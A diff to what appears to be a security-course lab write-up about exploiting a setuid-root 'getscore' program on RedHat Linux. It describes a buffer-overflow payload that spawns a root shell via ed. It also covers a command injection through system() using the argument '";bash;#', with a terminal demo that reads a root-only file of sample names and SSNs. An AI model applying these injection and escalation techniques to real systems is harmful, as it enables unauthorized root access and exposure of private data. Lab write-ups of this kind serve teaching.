@@ -66,11 +66,11 @@ the string `"ed"` by pointing at the second to last character in the string:
 
 If you are not familiar, before we had vim we had vi, and before vi we had punch
 cards. No, actually, there was this program called `ed` that was what was called
-a line editor. It essentially acted like a shell, but instead the commands being
-programs that carry out different tasks, it took commands that edit different
-parts of your file. However, it also has one very nice feature: It can execute
-arbitrary shell commands itself and print the result. Which means we can run say
-`bash` from inside of `ed` and have a root shell!
+a line editor. It essentially acted like a shell, but instead of the commands
+being programs that carry out different tasks, it took commands that edit
+different parts of your file. However, it also has one very nice feature: It can
+execute arbitrary shell commands itself and print the result. Which means we can
+run, say, `bash` from inside of `ed` and have a root shell!
 
 [1] In actuality this depends on variables set in limits.h, but there are
 131072 bytes available for args + environ on RHL8
@@ -174,16 +174,17 @@ contents of the two files as the command line args. Rather, it is best to run
 the program as such:
 
     ./getscore "$(cat payload1)" "$(cat payload2)"
-    
-The `"$()"` construct guaranteed that the two strings will be passed in raw.
-Additionally, I've included the correct argument strings for both RedHat 8 and 9
-in `rhl8-payload1`, `rhl8-payload2`, `rhl-payload2`, and `rhl-payload2`.
+
+The `"$()"` construct guarantees that the two strings will be passed in raw and
+special shell characters won't be interpreted. Additionally, I've included the
+correct argument strings for both RedHat 8 and 9 in `rhl8-payload1`,
+`rhl8-payload2`, `rhl9-payload2`, and `rhl9-payload2`.
 
 ## Additional vulnerability
 
 Additionally, the original call to `system()` in the code is insecure:
 
-    sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log", 
+    sprintf(command, "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log",
         ctime(&current_time), argv[1], argv[2]);
     if (system(command)){
         perror("Logging");
@@ -195,21 +196,21 @@ the string `";bash;#"` as the first argument and the empty string as the second.
 So then the call to system will become something like:
 
     echo "Fri Sep 23 09:13:35 2017
-    : Invalid user name or SSN: ";bash;#,%s\"|cat >> error.log
-    
+    : Invalid user name or SSN: ";bash;#,\"|cat >> error.log
+
 This translates to a call to `echo` (quoted strings in posix shell can contain
 newlines), followed by a call to bash, and the rest is commented out. Here's a
 demo:
 
-    [kevin@localhost kevin]$ ls -l getscore score.txt 
+    [kevin@localhost kevin]$ ls -l getscore score.txt
     -rwsr-xr-x    1 root     root        13587 Aug 25  2009 getscore
     -rw-------    1 root     root           87 Aug 23  2010 score.txt
-    [kevin@localhost kevin]$ cat score.txt 
+    [kevin@localhost kevin]$ cat score.txt
     cat: score.txt: Permission denied
     [kevin@localhost kevin]$ ./getscore '";bash;#' ''
     Invalid user name or SSN.
     Fri Sep 23 09:13:35 2017
-    : Invalid user name or SSN: 
-    [root@localhost kevin]# cat score.txt 
+    : Invalid user name or SSN:
+    [root@localhost kevin]# cat score.txt
     Mary Doe:123-45-6789:A+:an excellent student
     Tom Smith:567-89-1234:B:pay more attention
